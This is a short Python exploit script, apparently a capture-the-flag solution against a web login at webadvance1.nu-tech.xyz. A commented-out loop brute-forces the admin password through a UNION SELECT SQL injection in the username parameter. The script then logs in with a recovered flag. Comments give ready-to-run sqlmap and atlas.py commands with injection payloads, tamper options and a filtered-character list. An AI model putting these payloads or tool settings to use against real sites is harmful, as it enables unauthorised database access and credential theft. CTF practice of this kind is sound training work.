import requests
import string

CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_,%*(){.}&$#@!:'

CHARSET = ''

for i in range(0x20,256):
	if chr(i) in string.printable:
		CHARSET += chr(i)

blacklist = ',%*().&$#@:\"\'![]\\;<>=|'

for i in blacklist :
	CHARSET = CHARSET.replace(i,'')

print(CHARSET)

s = requests.Session()
temp = ''
password_list = ''

# while True:

# 	for c in CHARSET:

# 		temp_password = password_list + c

# 		username = f"admin' union select 1,2,'{temp_password}' order by 3 -- -"
# 		password = "1"

# 		url = 'https://webadvance1.nu-tech.xyz/'
# 		get_data = f'?username={username}&password={password}'

# 		res = requests.get(url+get_data)
# 		# print(get_data, res.text)
# 		if "admin" in res.text:
# 			# DATABASE += c

# 			password_list += temp
# 			# print(f"Database: {DATABASE}")
# 			print(f"password: {password_list}")
# 			# time.sleep(7)
			
# 			break
# 		elif c == '~':
# 			exit()
# 		temp = c


# https://www.cnblogs.com/deen-/p/7008939.html



username = "admin"
password = "NUTECH{INJ3CTT3R00S}"

url = 'https://webadvance1.nu-tech.xyz/'
get_data = f'?username={username}&password={password}'

res = requests.get(url+get_data)
print(res.text)
# print (list(res.text))

# python atlas.py --url 'https://webadvance1.nu-tech.xyz/?username=%%10%%&password=1' --payload="' union select 1,username,3 from users limit 1,0 -- -" --random-agent -v

# sqlmap --url="https://webadvance1.nu-tech.xyz/?username=TEST&password=1" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --technique=u --union-cols=3 --union-char='a' --dbms=MySQL --os=Linux --current-user --tamper=percentage -v 2 --prefix="\`" --suffix="-- -"

# --tamper=overlongutf8more